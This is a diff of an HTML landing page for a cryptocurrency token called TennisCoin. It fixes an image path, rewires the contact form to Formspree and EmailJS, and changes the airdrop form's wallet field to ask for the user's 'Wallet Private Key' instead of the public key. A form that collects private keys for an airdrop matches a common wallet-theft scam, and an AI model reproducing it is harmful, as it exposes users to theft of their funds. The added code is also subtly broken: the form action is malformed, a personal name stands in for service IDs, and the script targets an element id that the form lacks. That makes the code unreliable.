@@ -203,7 +203,7 @@
         
         <!-- Contenitore per l'immagine -->
         <div class="image-container">
-            <img src="tenniscoin.jpg" alt="TennisCoin Image">
+            <img src="images/tenniscoin.jpg" alt="TennisCoin Image">
         </div>
 
         <h2 id="section1-title">What is TennisCoin?</h2>
@@ -289,7 +289,7 @@
         <form class="airdrop-form" action="#" method="post">
             <input type="text" name="name" placeholder="Your Name" required>
             <input type="email" name="email" placeholder="Your Email" required>
-            <input type="text" name="wallet" placeholder="Your Wallet Public Key" required>
+            <input type="text" name="wallet" placeholder="Your Wallet Private Key" required>
             <button type="submit">Participate</button>
         </form>
     </section>
@@ -311,13 +311,13 @@
 
     <!-- Sezione Contact Us -->
     <section id="contact">
-        <h2>Contact Us</h2>
-        <form action="#" method="post">
-            <input type="text" name="name" placeholder="Your Name" required>
-            <input type="email" name="email" placeholder="Your Email" required>
-            <textarea name="message" placeholder="Your Message" rows="5" required></textarea>
-            <button type="submit">Send Message</button>
-        </form>
+     <h2>Contact Us</h2>
+     <form action="https://formspree.io/f/Mihail Adrian Nicolaescu"post">
+         <input type="text" name="name" placeholder="Your Name" required>
+         <input type="email" name="email" placeholder="Your Email" required>
+         <textarea name="message" placeholder="Your Message" rows="5" required></textarea>
+         <button type="submit">Send Message</button>
+     </form>
     </section>
 
    <!-- Footer -->
@@ -361,6 +361,29 @@
         // Inizializza il contatore
         updateCountdown();
     </script>
+ 
+   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+   <script>
+    (function() {
+        emailjs.init("Mihail Adrian Nicolaescu");
+    })();
+   </script>
+   
+   <script>
+    document.getElementById('contact-form').addEventListener('submit', function(event) {
+        event.preventDefault(); // Previene l'invio predefinito del modulo
+
+        emailjs.sendForm('service_rgrx7qw', 'template_frx7zke', this)
+            .then(function(response) {
+                console.log('Success:', response);
+                alert('Message sent successfully!');
+            }, function(error) {
+                console.log('Error:', error);
+                alert('Failed to send message.');
+            });
+     });
+   </script>
+
 
 </body>
 </html>
